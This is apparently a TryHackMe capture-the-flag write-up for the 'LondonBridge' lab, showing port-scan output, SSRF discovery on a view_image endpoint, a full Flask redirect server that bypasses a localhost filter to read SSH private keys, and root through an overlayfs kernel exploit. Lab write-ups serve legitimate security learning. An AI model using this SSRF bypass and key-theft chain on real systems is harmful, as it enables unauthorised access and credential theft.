----------------

### CTF: THM
### Lab: LondonBridge

---------------

![image](https://github.com/user-attachments/assets/9fc3a6b2-580f-4581-a574-c403b9d47b7c)

---------------

- Rustscan's output
      
      ❯ rustscan -a 10.10.227.38 -- -Pn -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.227.38:22
      Open 10.10.227.38:8080
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 06:23 WAT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:23
      Completed NSE at 06:23, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:23
      Completed NSE at 06:23, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:23
      Completed NSE at 06:23, 0.00s elapsed
      Initiating Parallel DNS resolution of 1 host. at 06:23
      Completed Parallel DNS resolution of 1 host. at 06:23, 0.05s elapsed
      DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 06:23
      Scanning 10.10.227.38 [2 ports]
      Discovered open port 8080/tcp on 10.10.227.38
      Discovered open port 22/tcp on 10.10.227.38
      Completed Connect Scan at 06:23, 0.19s elapsed (2 total ports)
      Initiating Service scan at 06:23
      Scanning 2 services on 10.10.227.38
      Completed Service scan at 06:25, 124.91s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.227.38.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 06:25
      Completed NSE at 06:25, 15.69s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 06:25
      Completed NSE at 06:26, 2.05s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 06:26
      Completed NSE at 06:26, 0.00s elapsed
      Nmap scan report for 10.10.227.38
      Host is up, received user-set (0.19s latency).
      Scanned at 2024-11-05 06:23:38 WAT for 143s
      
      PORT     STATE SERVICE    REASON  VERSION
      22/tcp   open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb
      |   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw=
      |   256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1
      8080/tcp open  http-proxy syn-ack gunicorn
      | http-methods: 
      |_  Supported Methods: OPTIONS GET HEAD
      |_http-title: Explore London
      |_http-server-header: gunicorn
      | fingerprint-strings: 
      |   GetRequest: 
      |     HTTP/1.0 200 OK
      |     Server: gunicorn
      |     Date: Tue, 05 Nov 2024 10:16:11 GMT
      |     Connection: close
      |     Content-Type: text/html; charset=utf-8
      |     Content-Length: 2682
      |     <!DOCTYPE html>
      |     <html lang="en">
      |     <head>
      |     <meta charset="UTF-8">
      |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
      |     <title>Explore London</title>
      |     <style>
      |     body {
      |     font-family: Arial, sans-serif;
      |     margin: 0;
      |     padding: 0;
      |     background-color: #f2f2f2;
      |     header {
      |     background-color: #333;
      |     color: #fff;
      |     padding: 10px 20px;
      |     text-align: center;
      |     background-color: #444;
      |     color: #fff;
      |     padding: 10px 20px;
      |     text-align: center;
      |     color: #fff;
      |     text-decoration: none;
      |     margin: 0 10p
      |   HTTPOptions: 
      |     HTTP/1.0 200 OK
      |     Server: gunicorn
      |     Date: Tue, 05 Nov 2024 10:16:11 GMT
      |     Connection: close
      |     Content-Type: text/html; charset=utf-8
      |     Allow: OPTIONS, GET, HEAD
      |_    Content-Length: 0
      1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
      SF-Port8080-TCP:V=7.94SVN%I=7%D=11/5%Time=6729ABE1%P=x86_64-pc-linux-gnu%r
      SF:(GetRequest,B15,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:
      SF:\x20Tue,\x2005\x20Nov\x202024\x2010:16:11\x20GMT\r\nConnection:\x20clos
      SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
      SF:02682\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x2
      SF:0\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"v
      SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x
      SF:20\x20\x20\x20<title>Explore\x20London</title>\n\x20\x20\x20\x20<style>
      SF:\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x
      SF:20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\n\x20\x20\x
      SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x
      SF:20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\
      SF:x20\x20\x20\x20\x20\x20background-color:\x20#f2f2f2;\n\x20\x20\x20\x20\
      SF:x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20\x20
      SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\n\x2
      SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\
      SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\n\x20\
      SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20
      SF:\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20nav\x20{
      SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20
      SF:#444;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\
      SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020
      SF:px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20cen
      SF:ter;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x
      SF:20nav\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:
      SF:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decorat
      SF:ion:\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\
      SF:x200\x2010p")%r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gu
      SF:nicorn\r\nDate:\x20Tue,\x2005\x20Nov\x202024\x2010:16:11\x20GMT\r\nConn
      SF:ection:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAll
      SF:ow:\x20OPTIONS,\x20GET,\x20HEAD\r\nContent-Length:\x200\r\n\r\n");
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- FFUF's directory scan

![image](https://github.com/user-attachments/assets/0c475fb2-a5af-4129-a7c0-2453d2740f36)


- I tried the `view_image` route and got a 500 error when I tried the `GET` method.I tried the `POST` method and discovered it required the `image_url` parameter.Then,I tried to load a url to see the output but it just reflects it back.

![image](https://github.com/user-attachments/assets/22d97295-dc4e-4ffe-80ab-c1711b24da43)

- I fuzzed for more parameter with burp suite.I intercepted the curl request with burpsuite.

![image](https://github.com/user-attachments/assets/5742d7bf-fa9f-41f8-bcab-52313e411f68)

- Then,I fuzzed for params with `Burp Intruder`.I used the wordlist `common.txt` to fuzz.I got the param `www` which successfully loaded the url of the target.The endpoint is vulnerable to server side request forgery.

![image](https://github.com/user-attachments/assets/ff84ede2-75e2-4af1-b4a7-50307d8d9c03)

- I tried to load localhost and see if I can fuzz for internal ports but I got the `403` error.

![image](https://github.com/user-attachments/assets/a731fa11-a793-4eb9-8f0a-9cb9159ea031)

- I bypassed the 403 error by setting up a site which redirects to the localhost url.I exploited this by setting up a Flask server with the code below.The index page takes in 2 params which is the `port` and `file`.The port serves as the internal port we want to load,while the `file` param signifies the file that we want to read.

```python3
#! /usr/bin/env python3
from flask import Flask, redirect,request
from urllib.parse import quote
app = Flask(__name__)    

@app.route('/',methods=['GET'])    
def root():
    port = request.args.get("port")
    file = request.args.get("file")
    if file != None:
        url =  f"http://127.0.0.1:{port}/{file}"
    else:
        url = f"http://127.0.0.1:{port}/"
    return redirect(url, code=301)
    
if __name__ == "__main__":
    app.run(host="<ip>", port=8080)
```

![image](https://github.com/user-attachments/assets/957e3bf8-62bb-45be-a479-0b00a57fedaa)

- Filter bypassed

![image](https://github.com/user-attachments/assets/cd6ba7d8-392c-417d-b590-2238f648695e)

- I was able to read the ssh's id_rsa and authorized_keys files.It should be noted that `&` should be passed url encoded as seen below.The `authorized_keys` file helped me identify the user.

![image](https://github.com/user-attachments/assets/e3f02a06-9ecf-4f8c-b277-08d89af8fb31)

- User `beth` identified

![image](https://github.com/user-attachments/assets/b8de72fe-9a79-46b6-b340-2bfe23cc9da9)

- Ssh access

![image](https://github.com/user-attachments/assets/a20a9946-6178-42dc-a226-dd651314bf13)

### Privesc with Overlayfs

- This version of ubuntu is vulnerable to kernel exploit `overlayfs`.

![image](https://github.com/user-attachments/assets/14b05b42-2449-4f10-8f55-bbef74b8453c)

- I transferred the exploit with python's `http.server` module and executed the binary because it was compiled.

![image](https://github.com/user-attachments/assets/5b733342-95d4-4132-add6-fe1743c754b5)

- Root-:

![image](https://github.com/user-attachments/assets/f79434f1-61f1-4dd6-bc61-9e02f72818fe)

---------------

### THANKS FOR READING!!!

---------------


















